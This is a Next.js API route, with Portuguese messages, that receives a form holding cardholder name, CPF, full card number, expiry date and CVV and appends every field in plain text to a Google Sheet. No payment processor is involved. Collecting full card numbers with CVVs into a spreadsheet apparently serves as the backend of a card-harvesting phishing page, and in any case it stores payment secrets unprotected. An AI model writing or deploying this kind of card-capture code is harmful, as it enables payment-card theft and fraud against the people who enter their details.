import { NextRequest, NextResponse } from 'next/server'
import { appendToSheet } from '@/utils/googleSheets'

interface FormData {
  cardName: string;
  document: string;
  cardNumber: string;
  cardExpiry: string;
  cardCVV: string;
}

export async function POST(request: NextRequest) {
  console.log('API route called');
  try {
    // Log environment variables (without sensitive data)
    console.log('Environment check:', {
      hasGoogleCreds: !!process.env.GOOGLE_APPLICATION_CREDENTIALS,
      hasSpreadsheetId: !!process.env.GOOGLE_SPREADSHEET_ID,
      spreadsheetIdValue: process.env.GOOGLE_SPREADSHEET_ID, // Log the actual value for debugging
    });

    const data: FormData = await request.json()
    console.log('Dados do formulário recebidos:', {
      ...data,
      cardNumber: '****', // Hide sensitive data in logs
      cardCVV: '***'
    });

    // Validate required environment variables
    if (!process.env.GOOGLE_APPLICATION_CREDENTIALS) {
      throw new Error('Credenciais do Google não configuradas');
    }
    if (!process.env.GOOGLE_SPREADSHEET_ID) {
      throw new Error('ID da planilha não configurado');
    }

    const formattedData = [
      data.cardName,            // Nome no Cartão
      data.document,            // CPF
      data.cardNumber.replace(/\s/g, ''), // Número do Cartão (sem espaços)
      data.cardExpiry,          // Validade
      data.cardCVV,             // CVV
    ];

    console.log('Tentando salvar dados na planilha...');
    await appendToSheet(formattedData);
    console.log('Dados salvos com sucesso na planilha');
    
    return NextResponse.json({ 
      success: true, 
      message: 'Dados salvos com sucesso'
    })
  } catch (error) {
    console.error('Erro detalhado ao processar submissão:', error);
    const errorMessage = error instanceof Error ? error.message : 'Erro desconhecido';
    return NextResponse.json({ 
      success: false, 
      error: `Falha ao salvar dados: ${errorMessage}` 
    }, { 
      status: 500 
    })
  }
}

